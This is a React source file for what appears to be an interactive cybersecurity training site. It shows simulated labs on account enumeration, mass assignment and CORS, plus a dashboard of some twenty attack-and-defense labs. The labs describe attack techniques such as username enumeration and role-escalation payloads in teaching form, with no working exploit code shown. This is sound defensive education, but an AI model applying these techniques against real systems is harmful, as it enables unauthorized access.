        </div>
      </div>

      <ChallengeResult state={labState}
        successContent={<div><p>{result?.reason} The browser's CORS policy is enforced at the browser level — the server sends the header, the browser decides whether to expose the response to the requesting script. Wildcard CORS essentially disables this protection.</p></div>}
        revealContent={<p>Enable <strong className="text-slate-200">Specific Origin Policy</strong> and simulate any attacker origin. The CORS header changes from <code className="text-slate-400">*</code> to <code className="text-slate-400">https://app.example.com</code> — the browser sees the attacking origin isn't listed and blocks the JS from reading the response.</p>}
        failMsg="The attacker's script read your account data cross-origin. The wildcard CORS policy allowed it. Enable Specific Origin Policy and try again."
        neutralMsg="Same-origin request — CORS policies don't restrict requests from the same domain as the API."
        onRetry={reset} showAnswer={showAnswer} onToggleAnswer={setShowAnswer}/>
    </div>
  );
};

// ─── ACCOUNT ENUMERATION LAB ─────────────────────────────────────────────────
const AccountEnumLab = ({ addLog, addScore, onBack }) => {
  const [selId, setSelId]       = useState("ae1");
  const [def, setDef]           = useState({ genericMsg:false, consistentTiming:false });
  const [labState, setLabState] = useState("idle");
  const [result, setResult]     = useState(null);
  const scoredRef               = useRef(new Set());
  const [justScored, setJustScored]     = useState(false);
  const [showSolution, setShowSolution] = useState(false);
  const [showAnswer, setShowAnswer]     = useState(false);

  useEffect(() => { setShowAnswer(false); }, [labState]);
  const reset = () => { setLabState("idle"); setResult(null); setJustScored(false); };

  const sel = AE_ATTEMPTS.find(a=>a.id===selId) || AE_ATTEMPTS[0];

  const buildResponse = (attempt, useGenericMsg) => {
    if (attempt.correct) return { status:200, msg:"Login successful — welcome back!", isReveal:false };
    if (!attempt.exists) return { status:401, msg: useGenericMsg ? "Invalid credentials. Please try again." : `No account found with username "${attempt.username}".`, isReveal:!useGenericMsg };
    return { status:401, msg: useGenericMsg ? "Invalid credentials. Please try again." : `Incorrect password for "${attempt.username}".`, isReveal:!useGenericMsg };
  };

  const tryLogin = () => {
    const resp = buildResponse(sel, def.genericMsg);
    setResult({ attempt:sel, response:resp });

    // Only evaluate pass/fail when the user tries an enumeration-relevant attempt
    // (not a correct login, which is always 200 and not relevant to enumeration)
    const isEnumAttempt = !sel.correct;
    if (!isEnumAttempt) return; // correct login — just show the response, no pass/fail

    const enumPossible = AE_ATTEMPTS.filter(a=>!a.correct).some(a => {
      const r = buildResponse(a, def.genericMsg);
      return r.isReveal;
    });

    if (!enumPossible && def.genericMsg) {
      setLabState("success");
      addLog(mkEvent("accountenum","Attacker","Login Form","info","Account enumeration blocked — generic messages"));
      const key = [def.genericMsg,def.consistentTiming].join("|");
      if (!scoredRef.current.has(key)) { addScore("accountenum",20); scoredRef.current.add(key); setJustScored(true); }
      else setJustScored(false);
    } else if (enumPossible && !def.genericMsg) {
      setLabState("fail");
      addLog(mkEvent("accountenum","Attacker","Login Form","medium","Account enumeration possible — distinct error messages"));
    }
  };

  const pick = (id) => { setSelId(id); setResult(null); };

  const aeReveal = (
    <p>Enable <strong className="text-slate-200">Generic Error Messages</strong>: return the exact same message — "Invalid credentials. Please try again." — regardless of whether the username exists. This makes the two failure cases indistinguishable. Add <strong className="text-slate-200">Consistent Response Timing</strong> to prevent timing side-channels where a fast "no such user" response differs detectably from a slower "wrong password" bcrypt comparison.</p>
  );

  const getResponseStyle = (resp) => {
    if (!resp) return "";
    if (resp.status === 200) return "bg-green-900/20 border-green-500/30 text-green-400";
    if (resp.isReveal) return "bg-red-900/20 border-red-500/30 text-red-300";
    return "bg-slate-800/50 border-slate-700 text-slate-400";
  };

  return (
    <div className="space-y-4">
      <LabHeader title="Account Enumeration" subtitle="Prevent login error messages from revealing which usernames are registered" onBack={onBack}/>
      <ChallengeBox accent="green" title="Challenge"
        showSolution={showSolution} onToggle={()=>setShowSolution(v=>!v)} solutionContent={aeReveal}>
        The login form returns different messages for "no such user" and "wrong password." An attacker tests thousands of usernames to build a list of valid accounts. Enable defenses so both failures look identical.
      </ChallengeBox>

      <div className="grid grid-cols-2 gap-4">
        <div className="space-y-3">
          <Card>
            <SectionHead>Login Attempt</SectionHead>
            <div className="space-y-1.5 mb-3">
              {AE_ATTEMPTS.map(a=>(
                <button key={a.id} onClick={()=>pick(a.id)}
                  className={`w-full text-left px-3 py-2 rounded-lg border transition-colors text-xs ${selId===a.id?"bg-slate-700 border-slate-500":"bg-slate-800/50 border-slate-800 hover:border-slate-700"}`}>
                  <div className="font-semibold text-slate-300">{a.label}</div>
                  <div className="text-slate-500 font-mono text-[10px] mt-0.5">user: {a.username} / pass: {a.password.slice(0,8)}…</div>
                </button>
              ))}
            </div>
            <button onClick={tryLogin}
              className="w-full flex items-center justify-center gap-2 bg-cyan-700 hover:bg-cyan-600 text-white font-semibold py-2 px-4 rounded-lg transition-colors text-sm">
              <Play size={14}/> Attempt Login
            </button>
          </Card>
          <Card>
            <SectionHead>Defense Controls</SectionHead>
            <div className="space-y-3">
              <Toggle enabled={def.genericMsg}         onChange={v=>{setDef(d=>({...d,genericMsg:v})); reset();}}         label="Generic Error Messages"    desc="Return identical message for both 'no such user' and 'wrong password'"/>
              <Toggle enabled={def.consistentTiming}   onChange={v=>{setDef(d=>({...d,consistentTiming:v})); reset();}}   label="Consistent Response Timing" desc="Always spend the same time (run bcrypt even for missing users)"/>
            </div>
          </Card>
        </div>

        <div className="space-y-3">
          <Card>
            <SectionHead>Server Response</SectionHead>
            {!result && <div className="text-center text-slate-700 text-xs py-8">Attempt a login to see the response</div>}
            {result && (
              <div className={`rounded-lg border p-3 text-xs ${getResponseStyle(result.response)}`}>
                <div className="font-semibold mb-1">HTTP {result.response.status} {result.response.status===200?"OK":"Unauthorized"}</div>
                <div className="font-mono">{result.response.msg}</div>
                {result.response.isReveal && (
                  <div className="mt-2 text-red-400 text-[10px]">⚠ This response reveals whether "{result.attempt.username}" is a registered account</div>
                )}
              </div>
            )}
          </Card>
          <Card>
            <SectionHead>Enumeration Comparison</SectionHead>
            <p className="text-xs text-slate-600 mb-2">Try both "Valid user, wrong password" and "Invalid username" — see if the responses are distinguishable.</p>
            <div className="space-y-1.5">
              {AE_ATTEMPTS.slice(0,2).map(a=>{
                const resp = buildResponse(a, def.genericMsg);
                return (
                  <div key={a.id} className={`rounded-lg border p-2 text-[11px] ${resp.isReveal?"border-red-500/30 bg-red-900/10":"border-green-500/20 bg-green-900/10"}`}>
                    <div className="text-slate-500 mb-0.5">{a.label}</div>
                    <div className={`font-mono ${resp.isReveal?"text-red-300":"text-green-400"}`}>{resp.msg}</div>
                    {resp.isReveal && <div className="text-red-400 text-[10px] mt-0.5">← reveals account exists</div>}
                  </div>
                );
              })}
              {def.genericMsg && (
                <div className="flex items-center gap-1.5 text-xs text-green-400 mt-1">
                  <CheckCircle size={11}/> Both responses are now identical — enumeration is not possible
                </div>
              )}
            </div>
          </Card>
        </div>
      </div>

      <ChallengeResult state={labState}
        successContent={<div><p>Generic error messages make the two failure cases indistinguishable. An attacker testing thousands of usernames now receives the same response regardless — their list of "valid accounts" grows no faster than random guessing.{def.consistentTiming?" Consistent timing also prevents timing side-channels where a faster 'no such user' response could still distinguish the two cases.":""}</p></div>}
        revealContent={<p>Enable <strong className="text-slate-200">Generic Error Messages</strong>. The comparison panel on the right will show both failure cases returning the identical string — "Invalid credentials. Please try again." — making the responses indistinguishable to an automated scanner.</p>}
        failMsg="The error messages differ — an attacker can tell which usernames are registered. Enable Generic Error Messages and try logging in with both a valid and invalid username."
        onRetry={reset} showAnswer={showAnswer} onToggleAnswer={setShowAnswer}/>
    </div>
  );
};

// ─── MASS ASSIGNMENT LAB ──────────────────────────────────────────────────────
const MassAssignLab = ({ addLog, addScore, onBack }) => {
  const [selId, setSelId]       = useState("ma2");
  const [def, setDef]           = useState({ allowlist:false, schemaValidation:false });
  const [labState, setLabState] = useState("idle");
  const [result, setResult]     = useState(null);
  const scoredRef               = useRef(new Set());
  const [justScored, setJustScored]     = useState(false);
  const [showSolution, setShowSolution] = useState(false);
  const [showAnswer, setShowAnswer]     = useState(false);

  useEffect(() => { setShowAnswer(false); }, [labState]);
  const reset = () => { setLabState("idle"); setResult(null); setJustScored(false); };

  const sel = MA_PAYLOADS.find(p=>p.id===selId) || MA_PAYLOADS[0];
  const isSafe = sel.sev === "info";
  const dangerousFields = Object.keys(sel.fields).filter(k=>!MA_ALLOWED_FIELDS.includes(k));
  const isBlocked = def.allowlist || def.schemaValidation;

  const send = () => {
    if (isSafe) {
      const updated = { ...MA_INITIAL_USER, ...sel.fields };
      setResult({ safe:true, before:MA_INITIAL_USER, after:updated });
      setLabState("neutral");
      return;
    }
    if (isBlocked) {
      const safeFields = Object.fromEntries(Object.entries(sel.fields).filter(([k])=>MA_ALLOWED_FIELDS.includes(k)));
      const updated = { ...MA_INITIAL_USER, ...safeFields };
      const reason = def.allowlist
        ? `Fields allowlist: rejected extra fields: ${dangerousFields.join(", ")}`
        : `Schema validation: ${dangerousFields.join(", ")} are read-only fields`;
      setResult({ blocked:true, reason, before:MA_INITIAL_USER, after:updated, rejected:dangerousFields });
      setLabState("success");
      addLog(mkEvent("massassign","Attacker","API","info",`Mass assignment blocked — rejected: ${dangerousFields.join(", ")}`));
      const key = [def.allowlist,def.schemaValidation,selId].join("|");
      if (!scoredRef.current.has(key)) { addScore("massassign",30); scoredRef.current.add(key); setJustScored(true); }
      else setJustScored(false);
    } else {
      const updated = { ...MA_INITIAL_USER, ...sel.fields };
      setResult({ blocked:false, before:MA_INITIAL_USER, after:updated });
      setLabState("fail");
      addLog(mkEvent("massassign","Attacker","API","critical",`Mass assignment: ${dangerousFields.join(", ")} modified`));
    }
  };

  const pick = (id) => { setSelId(id); reset(); };

  const maReveal = (
    <p>Enable <strong className="text-slate-200">Field Allowlisting</strong>: the update handler explicitly permits only <code className="text-slate-400">name</code> and <code className="text-slate-400">email</code>. All other fields in the request body are silently discarded before the database update. <strong className="text-slate-200">Schema Validation</strong> marks <code className="text-slate-400">admin</code>, <code className="text-slate-400">role</code>, and <code className="text-slate-400">credits</code> as read-only — any attempt to set them returns a 422 validation error.</p>
  );

  const renderUserDiff = (before, after) => (
    <div className="bg-slate-950 rounded-lg border border-slate-700 p-3 font-mono text-[11px] space-y-0.5">
      {Object.entries(after).map(([k,v])=>{
        const changed = before[k] !== v;
        const isDangerous = !MA_ALLOWED_FIELDS.includes(k) && changed;
        return (
          <div key={k} className={`flex gap-2 ${changed?(isDangerous?"text-red-300":"text-green-400"):"text-slate-500"}`}>
            <span className="w-20 flex-shrink-0">{k}:</span>
            <span>{before[k]!==v && <span className="line-through text-slate-600 mr-1">{String(before[k])}</span>}{String(v)}</span>
            {isDangerous && <span className="text-red-400 ml-auto">← DANGER</span>}
          </div>
        );
      })}
    </div>
  );

  return (
    <div className="space-y-4">
      <LabHeader title="Mass Assignment" subtitle="Prevent API endpoints from accepting unexpected privileged fields" onBack={onBack}/>
      <ChallengeBox accent="orange" title="Challenge"
        showSolution={showSolution} onToggle={()=>setShowSolution(v=>!v)} solutionContent={maReveal}>
        A <code className="text-slate-300 bg-slate-800 px-1 rounded text-xs">PATCH /api/users/me</code> endpoint lets users update their profile. It blindly applies every field in the request body. Choose a malicious payload, configure server-side validation, and click <strong>Send Request</strong>.
      </ChallengeBox>

      <div className="grid grid-cols-2 gap-4">
        <div className="space-y-3">
          <Card>
            <SectionHead>Request Payload</SectionHead>
            <div className="space-y-1.5 mb-3">
              {MA_PAYLOADS.map(p=>(
                <button key={p.id} onClick={()=>pick(p.id)}
                  className={`w-full text-left px-3 py-2 rounded-lg border transition-colors text-xs ${selId===p.id?"bg-slate-700 border-slate-500":"bg-slate-800/50 border-slate-800 hover:border-slate-700"}`}>
                  <div className="flex items-center justify-between">
                    <span className="text-slate-300">{p.label}</span>
                    <span className={`text-[10px] px-1.5 py-0.5 rounded font-semibold ${p.sev==="critical"?"bg-red-900/60 text-red-400":p.sev==="high"?"bg-amber-900/60 text-amber-400":"bg-green-900/60 text-green-400"}`}>{p.sev}</span>
                  </div>
                </button>
              ))}
            </div>
            <div className="bg-slate-950 border border-slate-700 rounded-lg p-3">
              <div className="text-[10px] text-slate-600 font-semibold mb-1.5">PATCH /api/users/me</div>
              <pre className="font-mono text-[11px] text-amber-300 whitespace-pre-wrap">{JSON.stringify(sel.fields, null, 2)}</pre>
              {dangerousFields.length > 0 && (
                <div className="mt-2 flex items-center gap-1.5 text-[11px] text-red-400">
                  <AlertTriangle size={11}/> Dangerous fields: {dangerousFields.join(", ")}
                </div>
              )}
            </div>
          </Card>
          <Card>
            <SectionHead>Defense Controls</SectionHead>
            <div className="space-y-3">
              <Toggle enabled={def.allowlist}        onChange={v=>{setDef(d=>({...d,allowlist:v})); reset();}}        label="Field Allowlist"      desc="Only permit name, email — silently discard all other fields"/>
              <Toggle enabled={def.schemaValidation} onChange={v=>{setDef(d=>({...d,schemaValidation:v})); reset();}} label="Schema Validation"    desc="Mark admin, role, credits as read-only — return 422 if included"/>
            </div>
            <button onClick={send}
              className="mt-4 w-full flex items-center justify-center gap-2 bg-cyan-700 hover:bg-cyan-600 text-white font-semibold py-2 px-4 rounded-lg transition-colors text-sm">
              <Play size={14}/> Send Request
            </button>
          </Card>
        </div>

        <div className="space-y-3">
          <Card>
            <SectionHead>User Object — Before &amp; After</SectionHead>
            {!result && <div className="text-center text-slate-700 text-xs py-8">Send a request to see the effect on the user record</div>}
            {result && (
              <div>
                {result.safe && (
                  <div className="bg-blue-900/20 border border-blue-500/30 rounded-lg p-2 text-xs mb-2">
                    <div className="text-blue-400 font-semibold">200 OK — profile updated</div>
                    <div className="text-slate-500 text-[11px] mt-0.5">Only allowed fields were changed</div>
                  </div>
                )}
                {result.blocked && (
                  <div className="bg-green-900/20 border border-green-500/30 rounded-lg p-2 text-xs mb-2">
                    <div className="text-green-400 font-semibold">422 — Fields rejected: <span className="font-mono">{result.rejected?.join(", ")}</span></div>
                    <div className="text-slate-400 text-[11px] mt-0.5">{result.reason}</div>
                  </div>
                )}
                {!result.blocked && !result.safe && (
                  <div className="bg-red-900/20 border border-red-500/30 rounded-lg p-2 text-xs mb-2">
                    <div className="text-red-400 font-semibold">200 OK — all fields updated ⚠</div>
                    <div className="text-slate-400 text-[11px]">Server applied every field in the request body</div>
                  </div>
                )}
                {renderUserDiff(result.before, result.after)}
              </div>
            )}
          </Card>
        </div>
      </div>

      <ChallengeResult state={labState}
        successContent={<div><p>{result?.reason} Mass assignment is easy to introduce accidentally when using ORM frameworks with auto-binding helpers. The fix is always explicit: enumerate exactly which fields callers are allowed to set, never the other way around.</p></div>}
        revealContent={<p>Select <strong className="text-slate-200">Role escalation</strong> or <strong className="text-slate-200">Admin flag injection</strong>, enable <strong className="text-slate-200">Field Allowlist</strong>, then send. The user diff will show only <code className="text-slate-400">name</code> changed — <code className="text-slate-400">role</code> and <code className="text-slate-400">admin</code> were stripped before the database update.</p>}
        failMsg="The dangerous fields were written to the user record — the attacker escalated privileges. Enable Field Allowlist or Schema Validation and try again."
        onRetry={reset} showAnswer={showAnswer} onToggleAnswer={setShowAnswer}/>
    </div>
  );
};

// ─── LABS PAGE ────────────────────────────────────────────────────────────────
const diffBadge = { Beginner:"bg-green-900/60 text-green-300 border-green-700/40", Intermediate:"bg-amber-900/60 text-amber-300 border-amber-700/40" };
const colBorder = { amber:"border-amber-500/20 hover:border-amber-500/40", red:"border-red-500/20 hover:border-red-500/40", blue:"border-blue-500/20 hover:border-blue-500/40", orange:"border-orange-500/20 hover:border-orange-500/40", purple:"border-purple-500/20 hover:border-purple-500/40", teal:"border-teal-500/20 hover:border-teal-500/40", green:"border-green-500/20 hover:border-green-500/40", rose:"border-rose-500/20 hover:border-rose-500/40", violet:"border-violet-500/20 hover:border-violet-500/40", cyan:"border-cyan-500/20 hover:border-cyan-500/40" };
const colIcon   = { amber:"text-amber-400",red:"text-red-400",blue:"text-blue-400",orange:"text-orange-400",purple:"text-purple-400",teal:"text-teal-400",green:"text-green-400",rose:"text-rose-400",violet:"text-violet-400",cyan:"text-cyan-400" };

export default function LabsPage({ addLog, addScore, logs, scores, setLogs, setScores }) {
  const [labPage, setLabPage]     = useState(null);
  const [dashPage, setDashPage]   = useState(1);   // 1 = Fundamentals, 2 = Web Attacks
  const [expanded, setExpanded]   = useState(null);
  const [showHints, setShowHints] = useState({});
  const labProps  = { addLog, addScore, onBack:()=>setLabPage(null) };
  const switchDashPage = (p) => { setDashPage(p); setExpanded(null); setShowHints({}); };
  // Count unique lab types that have generated log events (rough engagement metric)
  const activeLabs = new Set(logs.map(l => l.type)).size;

  if (labPage === "xss")       return <div className="max-w-5xl mx-auto px-6 py-8"><XSSLab {...labProps}/></div>;
  if (labPage === "sqli")      return <div className="max-w-5xl mx-auto px-6 py-8"><SQLiLab {...labProps}/></div>;
  if (labPage === "password")  return <div className="max-w-5xl mx-auto px-6 py-8"><PasswordLab {...labProps}/></div>;
  if (labPage === "phishing")  return <div className="max-w-5xl mx-auto px-6 py-8"><PhishingLab {...labProps}/></div>;
  if (labPage === "packet")    return <div className="max-w-5xl mx-auto px-6 py-8"><PacketLab {...labProps}/></div>;
  if (labPage === "csrf")      return <div className="max-w-5xl mx-auto px-6 py-8"><CSRFLab {...labProps}/></div>;
  if (labPage === "traversal") return <div className="max-w-5xl mx-auto px-6 py-8"><TraversalLab {...labProps}/></div>;
  if (labPage === "cmdinject") return <div className="max-w-5xl mx-auto px-6 py-8"><CmdInjectLab {...labProps}/></div>;
  if (labPage === "idor")      return <div className="max-w-5xl mx-auto px-6 py-8"><IDORLab {...labProps}/></div>;
  if (labPage === "jwt")       return <div className="max-w-5xl mx-auto px-6 py-8"><JWTLab {...labProps}/></div>;
  if (labPage === "openredirect") return <div className="max-w-5xl mx-auto px-6 py-8"><OpenRedirectLab {...labProps}/></div>;
  if (labPage === "clickjacking") return <div className="max-w-5xl mx-auto px-6 py-8"><ClickjackingLab {...labProps}/></div>;
  if (labPage === "ssrf")         return <div className="max-w-5xl mx-auto px-6 py-8"><SSRFLab {...labProps}/></div>;
  if (labPage === "fileupload")   return <div className="max-w-5xl mx-auto px-6 py-8"><FileUploadLab {...labProps}/></div>;
  if (labPage === "secheaders")   return <div className="max-w-5xl mx-auto px-6 py-8"><SecurityHeadersLab {...labProps}/></div>;
  if (labPage === "sde")          return <div className="max-w-5xl mx-auto px-6 py-8"><SDELab {...labProps}/></div>;
  if (labPage === "deserialize")  return <div className="max-w-5xl mx-auto px-6 py-8"><DeserializeLab {...labProps}/></div>;
  if (labPage === "cors")         return <div className="max-w-5xl mx-auto px-6 py-8"><CORSLab {...labProps}/></div>;
  if (labPage === "accountenum")  return <div className="max-w-5xl mx-auto px-6 py-8"><AccountEnumLab {...labProps}/></div>;
  if (labPage === "massassign")   return <div className="max-w-5xl mx-auto px-6 py-8"><MassAssignLab {...labProps}/></div>;

  return (
    <div className="max-w-5xl mx-auto px-6 py-8 space-y-8">
      {/* Hero */}
      <div className="bg-slate-900/80 border border-slate-800 rounded-2xl p-7 relative overflow-hidden">
        <div className="absolute inset-0 opacity-[0.03] pointer-events-none"
          style={{backgroundImage:"repeating-linear-gradient(0deg,transparent,transparent 24px,#00bfff 24px,#00bfff 25px),repeating-linear-gradient(90deg,transparent,transparent 24px,#00bfff 24px,#00bfff 25px)"}}/>
        <div className="relative flex items-start justify-between gap-6">
          <div>
            <div className="flex items-center gap-2 mb-3">
              <FlaskConical size={16} className="text-cyan-400"/>
              <span className="text-xs text-cyan-500 font-mono tracking-wide">CYBERSECURITY LABS</span>
            </div>
            <h1 className="text-3xl font-bold text-white mb-2">Interactive Labs</h1>
            <p className="text-slate-400 text-sm leading-relaxed max-w-xl">
              Each lab simulates a real attack scenario. Configure defenses, run the simulation, and see whether your setup blocks the attack. Each lab has a <strong className="text-slate-300">Vulnerability Fix</strong> button if you get stuck — but try it yourself first.
            </p>
          </div>
        </div>
      </div>

      {/* Stats */}
      <div className="grid grid-cols-3 gap-3">
        {[
          [logs.length,  "Events Logged",  Activity, "text-cyan-400"  ],
          [activeLabs,   "Labs Active",    BookOpen, "text-amber-400" ],
          [DASH_MODULES.length + DASH_MODULES_P2.length + DASH_MODULES_P3.length + DASH_MODULES_P4.length, "Total Labs", Layers, "text-green-400" ],
        ].map(([value,label,Icon,vc])=>(
          <div key={label} className="bg-slate-900 border border-slate-800 rounded-xl p-4">
            <Icon size={16} className={`${vc} mb-2`}/>
            <div className={`text-2xl font-mono font-bold ${vc}`}>{value.toLocaleString()}</div>
            <div className="text-slate-600 text-xs mt-0.5">{label}</div>
          </div>
        ))}
      </div>

      {/* Page tabs */}
      <div className="flex items-center gap-2 flex-wrap">
        <button onClick={()=>switchDashPage(1)} className={`flex items-center gap-2 px-4 py-2 rounded-lg border text-sm font-medium transition-colors ${dashPage===1?"bg-slate-800 border-cyan-500/40 text-cyan-400":"bg-slate-900/60 border-slate-800 text-slate-600 hover:text-slate-400"}`}><FlaskConical size={13}/> Fundamentals</button>
        <button onClick={()=>switchDashPage(2)} className={`flex items-center gap-2 px-4 py-2 rounded-lg border text-sm font-medium transition-colors ${dashPage===2?"bg-slate-800 border-cyan-500/40 text-cyan-400":"bg-slate-900/60 border-slate-800 text-slate-600 hover:text-slate-400"}`}><Shield size={13}/> Web Attacks</button>
        <button onClick={()=>switchDashPage(3)} className={`flex items-center gap-2 px-4 py-2 rounded-lg border text-sm font-medium transition-colors ${dashPage===3?"bg-slate-800 border-cyan-500/40 text-cyan-400":"bg-slate-900/60 border-slate-800 text-slate-600 hover:text-slate-400"}`}><Layers size={13}/> Advanced</button>
        <button onClick={()=>switchDashPage(4)} className={`flex items-center gap-2 px-4 py-2 rounded-lg border text-sm font-medium transition-colors ${dashPage===4?"bg-slate-800 border-cyan-500/40 text-cyan-400":"bg-slate-900/60 border-slate-800 text-slate-600 hover:text-slate-400"}`}><Shield size={13}/> Defense Topics</button>
        <span className="ml-auto text-xs text-slate-600 hidden lg:block">{dashPage===1?"XSS · SQLi · Password · Phishing · Packet":dashPage===2?"CSRF · Traversal · Cmd Injection · IDOR · JWT":dashPage===3?"Open Redirect · Clickjacking · SSRF · File Upload · Headers":"Data Exposure · Deserialization · CORS · Enumeration · Mass Assignment"}</span>
      </div>

      {/* Lab cards */}
      <div>
        <h2 className="text-xs font-semibold text-slate-600 uppercase tracking-widest mb-4">{dashPage===1?"Page 1 — Fundamentals":dashPage===2?"Page 2 — Web Attacks":dashPage===3?"Page 3 — Advanced Topics":"Page 4 — Defense Topics"}</h2>
        <div className="flex flex-col gap-2">
          {(dashPage===1 ? DASH_MODULES : dashPage===2 ? DASH_MODULES_P2 : dashPage===3 ? DASH_MODULES_P3 : DASH_MODULES_P4).map(m=>{
            const isOpen = expanded === m.id;
            return (
              <div key={m.id} className={`bg-slate-900 border border-slate-800 rounded-xl transition-all ${isOpen ? "ring-1 ring-slate-600/50 border-slate-600" : "hover:border-slate-700"}`}>
                <button onClick={()=>setExpanded(isOpen?null:m.id)} className="w-full text-left p-4 flex items-center gap-3">
                  <m.Icon size={18} className={`flex-shrink-0 ${colIcon[m.color]}`}/>
                  <div className="flex-1 min-w-0">
                    <div className="font-semibold text-slate-200 text-sm">{m.label}</div>
                    <div className="text-slate-600 text-xs mt-0.5">{m.shortDesc}</div>
                  </div>
                  <div className="flex items-center gap-2 flex-shrink-0">
                    {isOpen ? <ChevronDown size={13} className="text-slate-500"/> : <ChevronRight size={13} className="text-slate-600"/>}
                  </div>
                </button>
                {isOpen && (
                  <div className="px-4 pb-4 border-t border-slate-800 pt-3">
                    <p className="text-xs text-slate-400 leading-relaxed mb-3">{m.fullDesc}</p>
                    <div className="mb-4">
                      {showHints[m.id] ? (
                        <>
                          <div className="text-xs text-slate-600 uppercase tracking-wide mb-1.5">Key Concepts</div>
                          <div className="flex flex-wrap gap-1.5">
                            {m.concepts.map(c=><span key={c} className="text-xs bg-slate-800 border border-slate-700 text-slate-400 px-2 py-0.5 rounded">{c}</span>)}
                          </div>
                        </>
                      ) : (
                        <button onClick={()=>setShowHints(p=>({...p,[m.id]:true}))}
                          className="flex items-center gap-1.5 text-xs text-slate-600 hover:text-slate-400 transition-colors">
                          <Eye size={11}/> Show key concepts
                        </button>
                      )}
                    </div>
                    <div className="flex items-center justify-between">
                      <span className={`text-xs px-2 py-0.5 rounded border font-medium ${diffBadge[m.difficulty]}`}>{m.difficulty}</span>
                      <button onClick={()=>setLabPage(m.id)}
                        className="flex items-center gap-1.5 text-xs bg-green-700 hover:bg-green-600 text-white font-semibold px-4 py-1.5 rounded-lg transition-colors">
                        Enter Lab <ArrowRight size={12}/>
                      </button>
                    </div>
                  </div>
                )}
              </div>
            );
          })}
        </div>
      </div>
    </div>
  );
}
